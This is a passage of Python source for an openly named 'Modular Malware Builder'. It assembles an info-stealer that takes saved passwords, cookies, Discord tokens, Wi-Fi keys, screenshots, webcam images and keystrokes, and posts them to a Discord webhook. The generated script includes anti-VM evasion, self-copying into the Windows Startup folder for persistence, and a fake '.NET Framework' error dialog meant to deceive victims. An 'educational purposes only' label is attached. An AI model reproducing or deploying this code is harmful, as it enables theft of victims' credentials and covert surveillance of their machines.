        basic_imports = [
            "import os",
            "import sys", 
            "import json",
            "import requests",
            "import time",
            "import threading",
            "from datetime import datetime"
        ]
        
        for imp in basic_imports:
            all_imports.add(imp)
        
        for imp in sorted(all_imports):
            script += imp + "\n"
        
        script += "\n"
        
        # Add module functions from files
        script += "# ========== MODULE FUNCTIONS ==========\n\n"
        for module in modules:
            module_code = self.load_module_code(module)
            if module_code:
                script += f"# --- {module.upper()} MODULE ---\n"
                
                # Clean the module code - remove duplicate imports
                clean_lines = []
                for line in module_code.split('\n'):
                    line_stripped = line.strip()
                    # Skip import lines that are already in imports section
                    if line_stripped.startswith('import ') or line_stripped.startswith('from '):
                        # Check if this import is already in our imports section
                        import_found = False
                        for imp in all_imports:
                            if line_stripped in imp or imp in line_stripped:
                                import_found = True
                                break
                        if not import_found:
                            clean_lines.append(line)
                    else:
                        clean_lines.append(line)
                
                script += "\n".join(clean_lines) + "\n\n"
        
        # Add config functions ONLY for selected options
        script += "# Configuration functions\n"
        for option in options:
            config_name = option.lower().replace('-', '_')
            config_code = self.load_config_code(config_name)
            if config_code:
                script += config_code + "\n\n"
        
        # Add main execution logic - FIXED to check options properly
        script += """
# ========== MAIN EXECUTION ==========

def send_to_discord(data, title="📡 Modular Stealer Report"):
    \"\"\"Send data to Discord webhook\"\"\"
    try:
        embed = {
            "title": title,
            "color": 16711680,
            "fields": [],
            "timestamp": datetime.now().isoformat()
        }
        
        for key, value in data.items():
            if isinstance(value, (dict, list)):
                value_str = json.dumps(value, indent=2)[:500]
            else:
                value_str = str(value)[:500]
            
            embed["fields"].append({
                "name": str(key).replace('_', ' ').title(),
                "value": value_str,
                "inline": False
            })
        
        payload = {
            "embeds": [embed],
            "username": "{} Stealer"
        }
        
        response = requests.post(CONFIG["webhook"], json=payload, timeout=15)
        return response.status_code in [200, 204]
    except Exception as e:
        print(f"[-] Discord send error: {{e}}")
        return False

def run_keylogger_module():
    \"\"\"Run keylogger module if selected\"\"\"
    try:
        print("[+] Starting keylogger...")
        
        # Check which keylogger functions are available
        has_full_keylogger = False
        has_simple_keylogger = False
        
        try:
            from keylogger import start_keylogger
            has_full_keylogger = True
        except:
            pass
        
        try:
            from keylogger import start_simple_keylogger
            has_simple_keylogger = True
        except:
            pass
        
        # Try full keylogger first
        if has_full_keylogger:
            try:
                result = start_keylogger(CONFIG["webhook"])
                if result.get("success"):
                    print("[✓] Keylogger with screenshots started")
                    return result
            except Exception as e:
                print(f"[!] Full keylogger failed: {{e}}")
        
        # Fallback to simple keylogger
        if has_simple_keylogger:
            try:
                result = start_simple_keylogger(CONFIG["webhook"])
                if result.get("success"):
                    print("[✓] Simple keylogger started")
                    return result
            except Exception as e:
                print(f"[!] Simple keylogger failed: {{e}}")
        
        print("[-] All keylogger methods failed")
        return None
        
    except Exception as e:
        print(f"[-] Keylogger exception: {{e}}")
        return None

def main():
    \"\"\"Main execution function\"\"\"
    results = {{}}
    threads = []
    
    # Anti-VM check - ONLY if selected
    if "Anti-VM" in CONFIG["options"]:
        try:
            # Try to import and run anti-vm check
            anti_vm_check = None
            try:
                from anti_vm import check_vm
                anti_vm_check = check_vm
            except:
                # Simple VM detection as fallback
                def simple_vm_check():
                    vm_indicators = ["vmware", "virtualbox", "qemu", "vbox", "hyper-v"]
                    system_info = str(platform.uname()).lower()
                    return any(indicator in system_info for indicator in vm_indicators)
                
                anti_vm_check = simple_vm_check
            
            if anti_vm_check and anti_vm_check():
                print("[!] VM detected - exiting")
                return
                
        except Exception as e:
            print(f"[!] Anti-VM check failed: {{e}}")
    
    # Start keylogger in separate thread if selected
    keylogger_result = None
    if "keylogger" in CONFIG["modules"]:
        keylogger_thread = threading.Thread(target=run_keylogger_module, daemon=True)
        keylogger_thread.start()
        threads.append(("keylogger", keylogger_thread))
        
        # Wait a bit for keylogger to initialize
        time.sleep(2)
    
    # Execute other modules
    for module in CONFIG["modules"]:
        if module == "keylogger":
            continue  # Already handled
            
        try:
            module_name = module.replace('_', ' ').title()
            print(f"[+] Executing: {{module_name}}")
            
            if module == "system_info":
                try:
                    from system_info import collect_system_info
                    results["system_info"] = collect_system_info()
                except Exception as e:
                    results["system_info"] = {{"error": str(e)}}
            
            elif module == "passwords":
                try:
                    from passwords import steal_passwords
                    results["passwords"] = steal_passwords()
                except Exception as e:
                    results["passwords"] = {{"error": str(e)}}
            
            elif module == "cookies":
                try:
                    from cookies import steal_cookies
                    results["cookies"] = steal_cookies()
                except Exception as e:
                    results["cookies"] = {{"error": str(e)}}
            
            elif module == "discord_tokens":
                try:
                    from discord_tokens import steal_discord_tokens
                    results["discord_tokens"] = steal_discord_tokens()
                except Exception as e:
                    results["discord_tokens"] = {{"error": str(e)}}
            
            elif module == "screenshot":
                try:
                    from screenshot import take_screenshot
                    results["screenshot"] = take_screenshot()
                except Exception as e:
                    results["screenshot"] = {{"error": str(e)}}
            
            elif module == "webcam":
                try:
                    from webcam import capture_webcam
                    results["webcam"] = capture_webcam()
                except Exception as e:
                    results["webcam"] = {{"error": str(e)}}
            
            elif module == "wifi_passwords":
                try:
                    from wifi_passwords import get_wifi_passwords
                    results["wifi_passwords"] = get_wifi_passwords()
                except Exception as e:
                    results["wifi_passwords"] = {{"error": str(e)}}
            
            print(f"[✓] {{module_name}} completed")
            
        except Exception as e:
            results[module] = {{"error": str(e)}}
            print(f"[-] {{module}} failed: {{e}}")
    
    # Send initial results to Discord
    if results:
        print("[+] Sending initial results to Discord...")
        if send_to_discord(results, "🧩 Initial Stealer Report"):
            print("[✓] Results sent successfully")
        else:
            print("[-] Failed to send initial results")
    
    # Apply configuration options - ONLY if selected
    if "Startup" in CONFIG["options"]:
        try:
            from startup import add_to_startup
            if add_to_startup():
                print("[✓] Added to startup")
        except:
            try:
                # Manual startup addition
                import shutil
                startup_path = os.path.join(
                    os.getenv("APPDATA"),
                    "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
                    os.path.basename(sys.executable)
                )
                shutil.copy(sys.executable, startup_path)
                print("[✓] Added to startup (manual)")
            except Exception as e:
                print(f"[-] Startup failed: {{e}}")
    
    # FAKE ERROR - ONLY if selected
    if "Fake Error" in CONFIG["options"]:
        try:
            from fake_error import show_fake_error
            show_fake_error()
        except:
            try:
                # Manual fake error
                import ctypes
                ctypes.windll.user32.MessageBoxW(
                    0,
                    "This application requires .NET Framework 4.8.\\\\nPlease install it and try again.",
                    "Runtime Error",
                    0x10
                )
            except:
                pass
    
    # Keep main thread alive if keylogger is running
    if "keylogger" in CONFIG["modules"]:
        print("[*] Keylogger is running in background. Press Ctrl+C to stop.")
        try:
            # Keep running to allow keylogger to continue
            while True:
                time.sleep(60)  # Sleep to reduce CPU usage
                
                # Optional: Periodic status update
                print("[*] Keylogger still active...")
                
        except KeyboardInterrupt:
            print("[!] Keylogger interrupted")
            
            # Try to stop keylogger if stop function exists
            try:
                if keylogger_result and "stop_function" in keylogger_result:
                    keylogger_result["stop_function"]()
                    print("[✓] Keylogger stopped")
            except:
                pass
    else:
        print("[*] Execution completed")

if __name__ == "__main__":
    # Initial delay to avoid detection
    time.sleep(2)
    
    # Run in thread to avoid blocking
    main_thread = threading.Thread(target=main, daemon=True)
    main_thread.start()
    
    # Keep script alive
    try:
        while main_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Main thread interrupted")
        
    print("[*] Program exiting")
""".format(name_tool)
        
        return script
    
        """Generate main script by combining modules - UPDATED VERSION"""
        script = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Modular Malware - Generated by {} Builder
# Educational purposes only

import os
import sys
import json
import requests
import platform
import socket
import getpass
import time
import threading
from datetime import datetime

# Configuration
CONFIG = {{
    "webhook": "{}",
    "modules": {},
    "options": {},
    "build_date": "{}"
}}

""".format(name_tool, webhook, json.dumps(modules), json.dumps(options), datetime.now().isoformat())
        
        # Add module-specific imports
        script += "# Module-specific imports\n"
        imports_map = {
            "keylogger": ["import keyboard", "import mss", "import mss.tools", "import io", "import base64"],
            "screenshot": ["import mss", "import mss.tools", "import io", "import base64", "from PIL import ImageGrab"],
            "webcam": ["import cv2", "import base64", "import io", "from PIL import Image"],
            "passwords": ["import sqlite3", "import base64", "from Crypto.Cipher import AES"],
            "discord_tokens": ["import sqlite3", "import base64"],
            "wifi_passwords": ["import subprocess", "import re"],
        }
        
        all_imports = set()
        for module in modules:
            if module in imports_map:
                for imp in imports_map[module]:
                    all_imports.add(imp)
        
        # Add basic imports that might be needed
        basic_imports = [
            "import os",
            "import sys", 
            "import json",
            "import requests",
            "import time",
            "import threading",
            "from datetime import datetime"
        ]
        
        for imp in basic_imports:
            all_imports.add(imp)
        
        for imp in sorted(all_imports):
            script += imp + "\n"
        
        script += "\n"
        
        # Add module functions from files
        script += "# ========== MODULE FUNCTIONS ==========\n\n"
        for module in modules:
            module_code = self.load_module_code(module)
            if module_code:
                script += f"# --- {module.upper()} MODULE ---\n"
                
                # Clean the module code - remove duplicate imports
                clean_lines = []
                for line in module_code.split('\n'):
                    line_stripped = line.strip()
                    # Skip import lines that are already in imports section
                    if line_stripped.startswith('import ') or line_stripped.startswith('from '):
                        # Check if this import is already in our imports section
                        import_found = False
                        for imp in all_imports:
                            if line_stripped in imp or imp in line_stripped:
                                import_found = True
                                break
                        if not import_found:
                            clean_lines.append(line)
                    else:
                        clean_lines.append(line)
                
                script += "\n".join(clean_lines) + "\n\n"
        
        # Add config functions
        script += "# Configuration functions\n"
        for option in options:
            config_name = option.lower().replace('-', '_')
            config_code = self.load_config_code(config_name)
            if config_code:
                script += config_code + "\n\n"
        
        # Add main execution logic
        script += """
# ========== MAIN EXECUTION ==========

def send_to_discord(data, title="📡 Modular Stealer Report"):
    \"\"\"Send data to Discord webhook\"\"\"
    try:
        embed = {{
            "title": title,
            "color": 16711680,
            "fields": [],
            "timestamp": datetime.now().isoformat()
        }}
        
        for key, value in data.items():
            if isinstance(value, (dict, list)):
                value_str = json.dumps(value, indent=2)[:500]
            else:
                value_str = str(value)[:500]
            
            embed["fields"].append({{
                "name": str(key).replace('_', ' ').title(),
                "value": value_str,
                "inline": False
            }})
        
        payload = {{
            "embeds": [embed],
            "username": "{} Stealer"
        }}
        
        response = requests.post(CONFIG["webhook"], json=payload, timeout=15)
        return response.status_code in [200, 204]
    except Exception as e:
        print(f"[-] Discord send error: {{e}}")
        return False

def run_keylogger_module():
    \"\"\"Run keylogger module if selected\"\"\"
    try:
        print("[+] Starting keylogger...")
        
        # Check which keylogger functions are available
        has_full_keylogger = False
        has_simple_keylogger = False
        
        try:
            from keylogger import start_keylogger
            has_full_keylogger = True
        except:
            pass
        
        try:
            from keylogger import start_simple_keylogger
            has_simple_keylogger = True
        except:
            pass
        
        # Try full keylogger first
        if has_full_keylogger:
            try:
                result = start_keylogger(CONFIG["webhook"])
                if result.get("success"):
                    print("[✓] Keylogger with screenshots started")
                    return result
            except Exception as e:
                print(f"[!] Full keylogger failed: {{e}}")
        
        # Fallback to simple keylogger
        if has_simple_keylogger:
            try:
                result = start_simple_keylogger(CONFIG["webhook"])
                if result.get("success"):
                    print("[✓] Simple keylogger started")
                    return result
            except Exception as e:
                print(f"[!] Simple keylogger failed: {{e}}")
        
        print("[-] All keylogger methods failed")
        return None
        
    except Exception as e:
        print(f"[-] Keylogger exception: {{e}}")
        return None

def main():
    \"\"\"Main execution function\"\"\"
    results = {{}}
    threads = []
    
    # Anti-VM check
    if "Anti-VM" in CONFIG["options"]:
        try:
            # Try to import and run anti-vm check
            anti_vm_check = None
            try:
                from anti_vm import check_vm
                anti_vm_check = check_vm
            except:
                # Simple VM detection as fallback
                def simple_vm_check():
                    vm_indicators = ["vmware", "virtualbox", "qemu", "vbox", "hyper-v"]
                    system_info = str(platform.uname()).lower()
                    return any(indicator in system_info for indicator in vm_indicators)
                
                anti_vm_check = simple_vm_check
            
            if anti_vm_check and anti_vm_check():
                print("[!] VM detected - exiting")
                return
                
        except Exception as e:
            print(f"[!] Anti-VM check failed: {{e}}")
    
    # Start keylogger in separate thread if selected
    keylogger_result = None
    if "keylogger" in CONFIG["modules"]:
        keylogger_thread = threading.Thread(target=run_keylogger_module, daemon=True)
        keylogger_thread.start()
        threads.append(("keylogger", keylogger_thread))
        
        # Wait a bit for keylogger to initialize
        time.sleep(2)
    
    # Execute other modules
    for module in CONFIG["modules"]:
        if module == "keylogger":
            continue  # Already handled
            
        try:
            module_name = module.replace('_', ' ').title()
            print(f"[+] Executing: {{module_name}}")
            
            if module == "system_info":
                try:
                    from system_info import collect_system_info
                    results["system_info"] = collect_system_info()
                except Exception as e:
                    results["system_info"] = {{"error": str(e)}}
            
            elif module == "passwords":
                try:
                    from passwords import steal_passwords
                    results["passwords"] = steal_passwords()
                except Exception as e:
                    results["passwords"] = {{"error": str(e)}}
            
            elif module == "cookies":
                try:
                    from cookies import steal_cookies
                    results["cookies"] = steal_cookies()
                except Exception as e:
                    results["cookies"] = {{"error": str(e)}}
            
            elif module == "discord_tokens":
                try:
                    from discord_tokens import steal_discord_tokens
                    results["discord_tokens"] = steal_discord_tokens()
                except Exception as e:
                    results["discord_tokens"] = {{"error": str(e)}}
            
            elif module == "screenshot":
                try:
                    from screenshot import take_screenshot
                    results["screenshot"] = take_screenshot()
                except Exception as e:
                    results["screenshot"] = {{"error": str(e)}}
            
            elif module == "webcam":
                try:
                    from webcam import capture_webcam
                    results["webcam"] = capture_webcam()
                except Exception as e:
                    results["webcam"] = {{"error": str(e)}}
            
            elif module == "wifi_passwords":
                try:
                    from wifi_passwords import get_wifi_passwords
                    results["wifi_passwords"] = get_wifi_passwords()
                except Exception as e:
                    results["wifi_passwords"] = {{"error": str(e)}}
            
            print(f"[✓] {{module_name}} completed")
            
        except Exception as e:
            results[module] = {{"error": str(e)}}
            print(f"[-] {{module}} failed: {{e}}")
    
    # Send initial results to Discord
    if results:
        print("[+] Sending initial results to Discord...")
        if send_to_discord(results, "🧩 Initial Stealer Report"):
            print("[✓] Results sent successfully")
        else:
            print("[-] Failed to send initial results")
    
    # Apply configuration options
    if "Startup" in CONFIG["options"]:
        try:
            from startup import add_to_startup
            if add_to_startup():
                print("[✓] Added to startup")
        except:
            try:
                # Manual startup addition
                import shutil
                startup_path = os.path.join(
                    os.getenv("APPDATA"),
                    "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
                    os.path.basename(sys.executable)
                )
                shutil.copy(sys.executable, startup_path)
                print("[✓] Added to startup (manual)")
            except Exception as e:
                print(f"[-] Startup failed: {{e}}")
    
    if "Fake Error" in CONFIG["options"]:
        try:
            from fake_error import show_fake_error
            show_fake_error()
        except:
            try:
                # Manual fake error
                import ctypes
                ctypes.windll.user32.MessageBoxW(
                    0,
                    "This application requires .NET Framework 4.8.\\\\nPlease install it and try again.",
                    "Runtime Error",
                    0x10
                )
            except:
                pass
    
    # Keep main thread alive if keylogger is running
    if "keylogger" in CONFIG["modules"]:
        print("[*] Keylogger is running in background. Press Ctrl+C to stop.")
        try:
            # Keep running to allow keylogger to continue
            while True:
                time.sleep(60)  # Sleep to reduce CPU usage
                
                # Optional: Periodic status update
                print("[*] Keylogger still active...")
                
        except KeyboardInterrupt:
            print("[!] Keylogger interrupted")
            
            # Try to stop keylogger if stop function exists
            try:
                if keylogger_result and "stop_function" in keylogger_result:
                    keylogger_result["stop_function"]()
                    print("[✓] Keylogger stopped")
            except:
                pass
    else:
        print("[*] Execution completed")

if __name__ == "__main__":
    # Initial delay to avoid detection
    time.sleep(2)
    
    # Run in thread to avoid blocking
    main_thread = threading.Thread(target=main, daemon=True)
    main_thread.start()
    
    # Keep script alive
    try:
        while main_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Main thread interrupted")
        
    print("[*] Program exiting")
""".format(name_tool)
        
        return script
    
    def _save_build_info(self, output_file, modules, options):
        """Save build information"""
        build_info = {
            "output_file": output_file,
            "modules": modules,
            "options": options,
            "build_date": datetime.now().isoformat(),
            "size": os.path.getsize(output_file),
            "tool_version": version_tool
        }
        
        info_dir = os.path.join(tool_path, "Programs", "Results", "Modular_Builds")
        os.makedirs(info_dir, exist_ok=True)
        
        info_file = os.path.join(info_dir, f"build_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(info_file, 'w') as f:
            json.dump(build_info, f, indent=2)
        
        self.log(f"📄 Build info saved: {info_file}", "info")
    
    def _build_complete(self):
        """Called when build completes"""
        self.progress.stop()
        self.build_btn.config(state=tk.NORMAL, text="🧩 BUILD MODULAR")
    
    def run(self):
        """Run the application"""
        self.root.mainloop()

def main():
    """Main function"""
    Clear()
    
    print(f"""
    {PREFIX1}──────────────────────────────────────────────────────────────{SUFFIX1}
    
    {red}          ███╗   ███╗ █████╗ ██╗     ██╗    ██╗ █████╗ ██████╗ ███████╗
    {red}          ████╗ ████║██╔══██╗██║     ██║    ██║██╔══██╗██╔══██╗██╔════╝
    {red}          ██╔████╔██║███████║██║     ██║ █╗ ██║███████║██████╔╝███████╗
    {red}          ██║╚██╔╝██║██╔══██║██║     ██║███╗██║██╔══██║██╔══██╗╚════██║
    {red}          ██║ ╚═╝ ██║██║  ██║███████╗╚███╔███╔╝██║  ██║██║  ██║███████║
    {red}          ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
    
    {PREFIX1}──────────────────────────────────────────────────────────────{SUFFIX1}
    {INFO} Tool:{red} Modular Malware Builder
    {INFO} Feature:{red} Loads code from separate module files
    {INFO} Modules:{red} Dynamic loading from virus-builder-tool/modules/
    {INFO} Warning:{red} Educational purposes only!
    {PREFIX1}──────────────────────────────────────────────────────────────{SUFFIX1}
    """)
    
    print(f"{LOADING} Initializing modular system...{reset}")
    time.sleep(1)
    
    try:
        builder = ModularMalwareBuilder()
        builder.run()
    except Exception as e:
        print(f"{ERROR} Failed to launch GUI: {red}{str(e)}{reset}")
    
    Reset()

if __name__ == "__main__":
    main()